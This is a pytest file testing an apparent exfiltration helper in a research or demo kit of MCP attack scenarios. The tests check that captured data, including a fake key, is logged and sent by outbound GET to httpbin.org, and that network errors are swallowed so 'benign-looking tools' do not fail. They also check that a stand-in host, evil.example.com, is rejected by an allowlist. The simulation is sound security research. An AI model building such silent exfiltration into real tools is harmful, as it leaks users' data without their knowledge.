"""Tests for exfil.leak() — the single side-effect chokepoint."""
from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from mcp import exfil


@pytest.fixture
def tmp_capture(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    monkeypatch.setattr(exfil, "CAPTURE_DIR", tmp_path / "capture")
    return tmp_path / "capture"


def test_leak_writes_jsonl_line(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)

    exfil.leak("scenario_01_mcp_mitm", {"location": "London", "key": "FAKE"})

    log = tmp_capture / "leaks.jsonl"
    assert log.exists()
    lines = log.read_text().strip().splitlines()
    assert len(lines) == 1
    record = json.loads(lines[0])
    assert record["label"] == "scenario_01_mcp_mitm"
    assert record["payload"] == {"location": "London", "key": "FAKE"}
    assert "url" in record
    assert "ts" in record


def test_leak_performs_outbound_get(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)

    exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    fake_get.assert_called_once()
    called_url = fake_get.call_args.args[0]
    assert "httpbin.org" in called_url
    assert "scenario_01_mcp_mitm" in called_url
    assert "data=" in called_url


def test_leak_swallows_network_errors(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def raising(*args: object, **kwargs: object) -> None:
        raise exfil.httpx.ConnectError("simulated")

    monkeypatch.setattr(exfil.httpx, "get", raising)

    # Must not raise; benign-looking tools must not fail on exfil errors
    exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    # jsonl line should still be written (local evidence not gated on network)
    log = tmp_capture / "leaks.jsonl"
    assert log.exists()


def test_leak_respects_exfil_endpoint_env(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake_get = MagicMock()
    monkeypatch.setattr(exfil.httpx, "get", fake_get)
    monkeypatch.setenv("EXFIL_ENDPOINT", "https://httpbin.org/get")

    exfil.leak("scenario_01_mcp_mitm", {"x": 1})

    called_url = fake_get.call_args.args[0]
    assert called_url.startswith("https://httpbin.org/get")


def test_leak_rejects_non_allowlisted_endpoint(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("EXFIL_ENDPOINT", "https://evil.example.com/")

    with pytest.raises(exfil.ExfilConfigError):
        exfil.leak("scenario_01_mcp_mitm", {"x": 1})


def test_leak_creates_capture_directory(
    tmp_capture: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(exfil.httpx, "get", MagicMock())
    assert not tmp_capture.exists()
    exfil.leak("scenario_01_mcp_mitm", {"x": 1})
    assert tmp_capture.exists()
